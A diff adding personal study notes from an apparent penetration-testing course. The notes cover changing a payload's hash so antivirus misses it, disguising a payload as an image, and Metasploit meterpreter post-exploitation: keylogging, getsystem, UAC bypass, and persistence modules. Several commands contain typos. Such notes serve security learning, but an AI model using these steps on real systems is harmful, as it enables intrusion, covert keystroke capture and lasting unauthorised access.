@@ -663,3 +663,50 @@ These are just some of the ways, and I mention them in the next video. 2 importa
 
     Keep yourself updated with new tools
 ```
+
+## Hexeditor & antiviruses
+### change md5sum of a file
+- check md5sum of file (renaming doesn't change hash) : md5sum file.extension
+- edit non critical text : hexeditor file.extension
+- edit source code : add random useless stuff
+
+payload file not detected and delete as other, but communication try blocked by IDS
+
+## make payload open image
+- find .png to .ico file
+- read doc about sfx archive : need winrar or 7zip
+
+# Section 11 Post exploit : modules, privileges escalation, data extract, etc.
+## use meterpreter session
+`msf6 > session -i [1-X]`
+- use bg (background cmd), upload/download cmd, getuid (get current hostname + username), core cmd, network cmd (ifconfig, netstats : list all open connections, ), etc.
+- ps (list pid + process name)
+- keyscan* cmd
+- getsystem : elevate to admin
+- bypass user account control for elevation
+```
+msf6 > search bypassuac
+msf6 > use exploit/windoxs/local/...
+msf6 > set SESSION X (meterpreter session)
+msf6 > run
+```
+
+## persistence on target system
+- make a payload available on a web server :
+```
+systemctl start apache2
+mv <payload> tp var/www/html
+```
+- use persistence modules :
+```
+msf6 > search persistence
+msf6 > use exploit/windoxs/local/persistence/...
+...
+```
+- search all post exploitation modules
+```
+msf6 > search post
+...
+```
+
+# Section 12 backdoor pydev
